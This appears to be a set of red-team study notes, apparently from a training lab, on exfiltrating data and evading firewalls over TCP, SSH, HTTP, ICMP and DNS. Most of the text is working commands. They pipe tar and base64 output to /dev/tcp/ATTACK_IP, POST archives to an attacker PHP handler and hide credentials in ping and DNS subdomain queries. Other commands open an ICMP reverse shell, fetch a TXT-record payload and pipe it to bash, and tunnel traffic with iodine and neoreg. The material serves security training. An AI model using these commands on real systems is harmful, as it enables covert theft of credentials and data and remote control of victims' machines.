Data exfiltration is a technique that we can perform to transfer data without being detected. It is used to emulate the normal network activities, and it relies on network protocols such as DNS, HTTP, SSH, etc. Data exfiltration over common protocols is challenging to detect and distinguished between legitimate and malicious traffic. 
Some protocols are not designed to carry data over them. However, threat actors find ways to abuse these protocols to bypass network-based security products such as a firewall. Using these techniques as a red teamer is essential to avoid being detected.


# TCP socket
One of the data exfiltration techniques that we may use in a non-secured environment, where we know there are no network-based security products. If we are in a well-secured environment, then this kind of exfiltration is not recommended, as it is **easy to detect** because we rely on non-standard protocols.
Besides the TCP socket, we'll also use data encoding and archiving. Making it harder to examine.
![[Pasted image 20240624155813.png]]
To start, we need to prepare a listener on our machine
```bash
nc -lnvp 8080 > /tmp/creds.data
```
We will be sending all the data we find to a file called `creds.data`. After that, inside the target machine we will use TCP to exfiltrate it.
```bash
tar zcf - ./ | base64 | dd conv=ebcdic > dev/tcp/ATTACK_IP/8080
```
Here, we are using the `tar` command with the `zcf` arguments to create a new (`c`) gzip to compress the selected folder (`z`) of the content of our current directory (`f - /`). We then base64 the output and create and copy a backup file with the `dd` command using EBCDIC encoding data. Finally, we redirect the `dd` command's output to transfer it using the TCP socket on the specified IP and port.
Now, we need to unencrypt our files
```bash
dd conv=ascii if=creds.data | base64 -d > creds.tar
```
In here we use the `dd` command to convert the received file to ASCII. And then decrypt the base64 to then pipe it into a `.tar` file. To decompress that `tar` we just use
```bash
tar xvf creds.tar
```
Where we extract the tar file (`x`), use verbose to list files (`v`) and to select a file (`f`).
Now we can check the files that we have borrowed.

# SSH
SSH protocol establishes a secure channel to interact and move data between the client and server, so all transmission is encrypted over the network.
![[Pasted image 20240624195841.png]]
To transfer data over SSH, we can use either the Secure Copy Protocol (`SCP`) or the SSH client. Let's asume that we don't have the `SCP` command available to transfer data over SSH. Thus, we will only use the SSH client.
Similar to the TCP transfer we will use `tar`
```bash
tar zcf - ./ | ssh user@IP "cd /tmp/; tar zxvf -"
```
The difference here being, that we won't have the need to encrypt our data, as SSH already does that for us, and in a more secure manner. Then we passed the compressed file over the SSH, which provides a way to execute a single command without having a full session, and that command being the one inside quotes, which moves the data over to `/tmp/` and decompresses it.
 
# HTTPS
We can also use HTTP/HTTPS protocol to exfiltrate data from a target to our machine. As a requirement for this technique, an attacker needs control over a webserver with a server-side programming language installed and enabled. For this demonstration we will use PHP but it can be implemented with any other (Node, python, Golang, etc.)
## HTTP POST Request
Exfiltration data through the HTTP protocol is **one of the best options** because it is challenging to detect. It is tough to distinguish between legitimate and malicious HTTP traffic. We will use the POST HTTP method for this, because if we use a GET request, all parameters are registered into the log file. While with a POST request, they don't. Besides some other benefits
- POST requests are never cached
- POST requests do not remain in the browser history
- POST requests cannot be bookmarked
- POST requests have no restrictions on data length
We can now inspect the Apache log file with HTTP requests, and check what they look like.
```bash
cat /var/log/apache2/access.log
```
In a typical real-world scenario, an attacker controls a webserver in the cloud somewhere on the Internet. Ana agent or command is executed from a compromised machine to sent the data outside the compromised machine's network over the internet into the webserver. Then an attacker can log in to a web server to get the data.
![[Pasted image 20240624211349.png]]

## HTTP Data Exfiltration
Based on the attacker configuration, we can set up either HTTP or HTTPS. We also need a PHP page that handles the PSOT HTTP request sent to the server. We will be using HTTP in this case.
To exfiltrate data, we can apply the following steps:
- We set up a web server with a data handler.
- A C2 agent or an attacker send the data. In this case, we will be using the `curl` command
- The webserver receives the data and stores it.
- We finally log into the webserver to copy all of the received data somewhere else.
Now, since we are using HTTP, all the data will be sent in cleartext. However, we can always use other techniques (tar and base64) to change the data's string format so that it wouldn't be in a human-readable format.
First we prepare a webserver with a data handler for this task. 
```php
<?php
	if(isset($_POST['file'])){
		$file = fopen("/tmp/http.bs64","w");
		fwrite($file, $_POST['file']);
		fclose($file);
	}
?>
```
The previous code is to handle POST request via `file` parameter and stores the received data in the `/tmp` directory as `http.bs64` file name.
Now from the target machine we are going to exfiltrate the data over the HTTP protocol, by using the `curl` command to send a HTTP POST request with the content of the folder we want to exfiltrate
```bash
curl --data "file=$(tar zcf - folder | base64)" http://web.server/handler.php
```
With this, we created an encrypted archived file that will send a POST request via the `file` parameter. Now, if we go to `/tmp` we will find our file with our encrypted data. Though, in checking the file, it will be broken up, this happens due to the URL encoding over the HTTP. The `+` symbol has been replaced with empty spaces, we can fix this with the `sed` command.
```bash
sudo sed -i 's/ /+/g' /tmp/http.bs64
```
Using this command, we just replaced the spaces with `+` characters to make it a valid base64
```bash
cat /tmp/http.bs64 | base64 -d | tar xvfz -
```
And we have our data decoded, and unarchived.

## HTTPS Communications
Now, instead of using the cleartext HTTP, we are going to take advantage of the encryption with SSL keys from HTTPS. If we apply the same technique that we used previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted.

## HTTP Tunneling
Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel.
Now, there are some cases where many internal computers are not reachable from the internet. In this case, we will create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol.
For HTTP tunneling, we will use [neoreg](https://github.com/L-codes/Neo-reGeorg) to establish a communication channel to access the internal network devices. We will start by generating an encrypted client file to upload to the target's web server
```bash
python3 neoreg.py generate -k Password123
```
With this, we generate encrypted tunneling clients with the `thm` key in the `neoreg_servers/` directory. We just need to upload the corresponding file to a webserver, so we can use that server as a tunnel between it, and another that has no connection to the internet. 
Once the file is inside our tunnel server we use
```bash
python3 neoreg.py -k Password123 -u http://tunnel.server/files/tunnel.php
```
Here we connect to the client and provide the key to decrypt the tunneling client. Once the tunneling client is connected, we are ready to use the tunnel connection as a proxy bind on our local machine on port 1080. So if we would like to access 172.1.2.3 on port 80, we can use the `curl` command with `--socks5` argument. We can also use other proxy apps like, ProxyChains, FoxyProxy, etc.
```bash
curl --socks5 127.0.0.1:1080 http://172.1.2.3:80
```
# ICMP
The Internet Control Message Protocol (ICMP) is a network layer protocol used to handle error reporting. Network devices such as routers use ICMP protocol to check network connectivities between devices. The ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test connectivity in the network, we can use the `ping` command to send ICMP packets through the network.
![[Pasted image 20240626153017.png]]
The `Host 1` sends an ICMP packet with and **echo-request** packet. Then if `Host 2` is available, it sends an ICMP packet back with an **echo reply** message confirming the availability.
## ICMP Data Section
On a high level, the ICMP packet structure contains a `Data` section that can include strings or copies of other information, such as the IPv4 header, used for error messages. This diagram shows the `Data` section, which is optional to use.
![[Pasted image 20240626153522.png]]
The Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the `Data` section and send it via ICMP packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.
To perform manual ICMP data exfiltration, we will be using that optional data section to transfer all the data we need. 
In **linux** `ping` has an argument `-p` where we can specify 16 bytes of data en hex representation to send through the packet. If we wanted to exfiltrate the following credentials `admin:password123` we first need to convert it into hex.
```bash
echo "admin:password123" | xxd -p
```
And then we can use the `ping` command with the hex value we got from converting our credentials
```bash
ping IP -c 1 -p 61646d696e3a70617373776f72643132330a
```

## ICMP Data Exfiltration
[[Metasploit]] uses the same technique explained before. However, it will capture incoming ICMP packets and wait for a Beginning of File (BOF) trigger value. Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value.
![[Pasted image 20240626162248.png]]
Now from our machine, we can set up the Metasploit framework **with root privileges** by selecting the `icmp_exfil` module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the `BPF_FILTER` option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packet that have the source IP of the attacking machine. We also need to select in which network interface to listen to.
```msfconsole
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACK_IP
set INTERFACE tun0
run
```
We can now use `nping`, an open source tool for network packet generation, response analysis, and response time measurement. The `nping` tool is part of the [[nmap]] suite tools.
First, we will send the BOF trigger from the ICMP machine so that the Metasploit framework starts writing to the disk. 
```bash
sudo nping --icmp -c 1 ATTACK_IP --data-string "BOFfile.txt"
```
We can now start sending all the other required data in separate ICMP packets
```bash
sudo nping --icmp -c 1 ATTACK_IP --data-string "admin:pass"
sudo nping --icmp -c 1 ATTACK_IP --data-string "user1:pass1"
sudo nping --icmp -c 1 ATTACK_IP --data-string "user2:pass2"
sudo nping --icmp -c 1 ATTACK_IP --data-string "EOF"
```
Now if we check our msfconsole, we will see that the data collection has ended, as our end trigger arrived, and all of the data has been stored.
## ICMP C2 Communication
We can execute commands over the ICMP protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool. It is an open source reverse shell written in Python3 and scapy. The tool uses the same concept, where an attacker utilizes the data section within the ICMP packet. Only that we will be sending commands that we want to be executed and the target will reply with the output.
![[Pasted image 20240626191900.png]]
Once we are on our target, we will be executing `icmpdoor` specifying the interface over which we will communicate and the destination of our C2 server
```bash
sudo icmpdoor -i eth0 -d C2_IP
```
Next, on our C2 server, we execute the `icmp-cnc` binary to communicate with the target. Once ran, a communication channel will be established over the ICMP protocol.
```bash
sudo icmp-cnc -i eth0 -d IP
```
Now, we have a reverse shell, we can start executing commands on our server.
# DNS
## DNS configuration
To perform exfiltration via the DNS protocol, we need to control a domain name and set up a DNS records, including NS, A or TXT. We will need to set up a name server for the domain name we control in the following manner:
- Add an `A` record that points to our Attacking machine IP. For example, Type: **A**, Subdomain Name: **t1ns**, Value: **Attack_IP**.
- Add an `NS` record that routes DNS queries to the `A` records in step 1. For example, Type: **NS**, Subdomain Name: **t1**, Value: **t1ns.tunnel.com.**
Once these two records are added the name server `t1.tunnel.com` should be ready to be used for DNS exfiltration purposes. We can test that the DNS is working correctly by doing:
```bash
dig t1ns.tunnel.com
```

## Exfiltration of DNS
Since DNS is not a transport protocol, many organizations don't regularly monitor the DNS protocol. The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide communications.
The DNS has limitations that need to be taken into consideration which are as follows
- The maximum length of the Fully Qualified Domain Name (**FQDN**) (including `.` separators is 255 characters.
- The subdomain name length must not exceed 63 characters.
Based on these limitations, we can use a limited number of characters to transfer data over the domain name. If we have a large file, 10 MB for example, it may need more than 50000 DNS requests to transfer the file completely. Therefore, it will be noisy traffic and easy to detect.
![[Pasted image 20240626204237.png]]
1. An attacker registers a domain name, for example, **tunnel.com** 
2. The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
3. The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where **passw0rd** is the data that needs to be transferred.
4. The DNS request is sent through the local DNS server and is forwarded through the Internet.
5. The attacker's authoritative DNS (malicious server) receives the DNS request.
6. Finally, the attacker extracts the password from the domain name.

---

There are many use case scenarios, but the typical one is when the firewall blocks and filters all traffic. We can pass data or TCP/UDP packets through a firewall using the DNS protocol, but it is important to ensure the DNS is allowed and resolving domain names to IP addresses.

---

Assuming we have a `credit.txt` file with sensitive data. To move it over the DNS protocol, we need to encode the content of the file and attach it as a subdomain name as follows.
![[Pasted image 20240626210339.png]]
1. Get the required data that needs to be transferred.
2. Encode the file using one of the encoding techniques.
3. Send the encoded characters as subdomain/labels.
4. Consider the limitations of the DNS protocol. Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters, and each subdomain label can't exceed 63 characters. If we do exceed these limits, we split the data and send more DNS requests!

In order to receive any DNS request, we need to capture the network traffic for any incoming UDP/53 packets using the `tcpdump` tool
```bash
sudo tcpdump -i eth0 udp port 53 -v
```
Once our machine is ready, we can move to the target's machine. In order to send the content of a file, we need to convert it into a string representation which could be done using any encoding representation such as Base64, Hex, Binary, etc. 
```bash
cat credit.txt | base64
```
Now that we have the Base64 representation, we need to split it into one or multiple DNS requests depending on the output's length and attach it as a subdomain name. 
For splitting into multiple DNS requests
```bash
cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed -r 's/.*/&.att.tunnel.com/' | awk '{print "dig +short " $1}' | bash
```
In this command, we read the file's content, encoded it using Base64. Then, we cleaned the string by removing the new lines and gathered every 18 characters as a group. Finally, we appended the name server "att.tunnel.com" for every group. And we added the dig command to send it over the DNS, and finally, we passed it to the bash to be executed.
The other way where we send a single DNS request, which we will be using for our data exfiltration. This time, we split every 18 characters with a `.` and add the name server similar to what we did in the previous command.
```bash
cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com
```
Next, we send the base64 data as subdomain name with considering the DNS limitation as follows
```bash
cat credit.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
```
With some adjustments to the single DNS request, we added the dig command to send it over the DNS, and finally, we passed it to the bash to be executed. If we check our `tcpdump` terminal, we should receive the data we sent from our target
```bash
sudo tcpdump -i eth0 udp port 53 -v
```
Once our DNS request is received, we can stop the `tcpdump` tool and clean the received data by removing unwanted strings, and finally decode back the data using Base64
```bash
echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
```
We can also clean the output of the multi DNS request technique
```bash
sed '1~2d' tcpd | cut -d ' ' -f 11 | cut -d '.' -f 1 | uniq | tr -d '\n' | base64 -d
```

---

C2 frameworks use the DNS protocol for communication, such as sending a command execution request and receiving execution results over the DNS protocol. They also use the TXT DNS record to run a dropper to download extra files on a victim machine. We will need to add a `TXT` DNS record to the `tunnel.com` domain name.
Let's say we have a script that needs to be executed in a target machine. First, we need to encode the script as a base64 representation and then create a TXT DNS record of the domain name we control with the content of the encoded script. The following is an example of the required script that needs to be added to the domain name:
```bash
#!/bin/bash
ping -c 1 test.tunnel.com
```
Now we need to have the base64 representation of our script, we add it as a TXT DNS record to the domain we control.
- Add a `TXT` record that points to the base64 of our script. For example, Type: **TXT**, Subdomain Name: **script**, Value: **Base64**.
Once we added it, we can check if the DNS record was created correctly, by using 
```bash
dig +short -t TXT script.tunnel.com
```
We should get the encrypted script. Now we can decode the base64 code and pass it to the `bash` command to execute it.
```bash
dig +short -t TXT sctipt.tunnel.com | tr -d "\"" | base64 -d | bash
```

## DNS Tunneling
This technique is also known as TCP over DNS, where an attacker encapsulates other protocols, such as HTTP requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS tunneling establishes a communication channel where data is sent and received continuously.
![[Pasted image 20240626232347.png]]
We will be using the [iodine](https://github.com/yarrick/iodine) tool for creating our DNS tunneling communications. To establish DNS tunneling we need to follow the following steps
1. Ensure to update the DNS records and create new NS points to our machine
2. Run `iodined` server from our machine. (note for the **server** side we use iodine**d**)
3. On the target, run the `iodine` client to establish the connection. (note for the client side we use iodine - without **d**)
4. SSH to the machine on the created network interface to create a proxy over DNS. We will be using the -D argument to create a dynamic port forwarding.
5. Once an SSH connection is established, we can use the local IP and the local port as a proxy in Firefox or ProxyChains.
First we run the server-side application from our machine.
```bash
sudo iodined -f -c -P Pass123 10.1.1.1/24 att.tunnel.com
```
With this we create a new network interface `dns0` for the tunneling over DNS, it runs in the foreground (`-f`). It skips checking the client IP address and port for each DNS request (`-c`). Sets a password for authentication (`-P`). Sets the network IP for the new network interface `dns0`, the IP address of the server will be 10.1.1.1 and the client 10.1.1.2. And we use the nameserver we previously set. 
On the target machine we need to connect to the server-side app
```bash
sudo iodine -P Pass123 att.tunnel.com
```
Once this connection is established, we open a new terminal and log in to 10.1.1.1 via SSH
All communication over the network 10.1.1.1/24 will be over the DNS. We will be using the `-D` argument for the dynamic port forwarding feature to sue the SSH session as a proxy. We need to use the `-f` argument to enforce ssh to go to the background. The `-4` arg forces the SSH client to bind on IPv4 only.
```bash
ssh USER@10.1.1.2 -4 -f -N -D 1080
```
Now that we have connected to the target over the `dns0` network, we leave it there and we can open a new terminal on our machine and use proxy chains, with `127.0.0.1` and port `1080` as proxy settings.
```bash
proxychains curl http://target.ip/demo.php

curl --socks5 127.0.0.1:1080 http://target.ip/demo.php
```

# Resources
The following link is a Living Off Trusted Sites that could be used to exfiltrate data or for C2 communication using legitimate websites. 

- [Living Off Trusted Sites (LOTS) Project](https://lots-project.com/)